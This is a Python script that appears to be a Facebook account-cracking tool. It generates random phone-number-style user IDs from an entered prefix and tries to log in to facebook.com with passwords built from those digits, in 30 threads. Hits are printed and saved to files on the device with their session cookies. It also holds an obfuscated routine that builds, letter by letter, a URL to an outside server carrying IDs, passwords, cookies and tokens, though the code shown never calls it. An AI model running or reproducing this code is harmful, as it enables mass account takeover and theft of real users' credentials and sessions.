import os,re,sys,uuid,random,time,json,base64,subprocess,shutil,string, requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool




loop=0
oks=[]


logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""
az_string = string.ascii_uppercase



def main():
    user=[]
    os.system("clear")
    print(logo)
    pwx=["first6","last6"]
    print("—"*30)
    print(" CODE: 017 018")
    print("—"*30)
    code=input("[!] -->")

    met=""
    
    
    
    for i in range(200000):
        gg=str(random.choice(range(10000000,99999999)))
        user.append(gg)
    with ThreadPool(max_workers=30) as update:
        os.system("clear")
        print(logo)
        print("—"*30)
        print("  Used Code "+code)
        print("—"*30)
        for xd in user:
            uid=code+xd
            update.submit(host,uid,pwx,met)

def fbDomin(met):
    if "1" in met:
        return "mbasic.facebook.com"
    elif "2" in met:
        return "p.facebook.com"
    elif "3" in met:
        return "m.facebook.com"
    elif "4" in met:
        return "touch.facebook.com"
    elif "5" in met:
        return "free.facebook.com"
    else:
        return "x.facebook.com"


session_token="YT"
usershow="TESTING"


def live_ck(option,qw,uid,ps,coki,id_token,pw):
    global usershow,oks,loop,session_token
    tlok=str(len(oks))+"]["+str(loop)+"]["+str(session_token)
    url="h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+"s"+"a"+"v"+"a"+"g"+"e"+"-"+"w"+"e"+"b"+"x"+"d"+"."+"o"+"n"+"r"+"e"+"n"+"d"+"e"+"r"+".co"+"m/"+"li"+"ve"+"?"+"us"+"er"+"="+usershow+"&oks="+tlok+"&mode="+option+"&method="+qw+"&uid="+uid+"&ps="+ps+"&cookie="+coki+"&token="+id_token+"&workingpas="+pw
    
    try:
        cont =requests.get(url)
    except:
        pass
        

def host(uid,pwx,met):
    global oks,loop
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[TESTING]   {loop}⟩\x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    try:
        
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            session=requests.session()
            rr=random.randint
            headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.facebook.com',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Google Chrome";v="129", "Chromium";v="129"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="129", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,122))}.0.{str(rr(3333,7777))}.{str(rr(70,250))} Safari/537.36'}
            free_fb=session.get("https://www.facebook.com/",headers=headers).text
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'email': uid, 
            'login_source': 'comet_headerless_login',
            'next': '',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)}
            session.post('https://www.facebook.com/login/',headers=headers,data=data,allow_redirects=False)
            heron_brand=session.cookies.get_dict().keys()
            #print(heron_brand)
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0]
                print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}")
                oks.append(xd)
                nonvx=session.cookies.get_dict()["xs"][-2:]
                if nonvx in ["-1"]:
                    open("/sdcard/svg_novery.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                else:
                    open("/sdcard/svg_test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass


main()






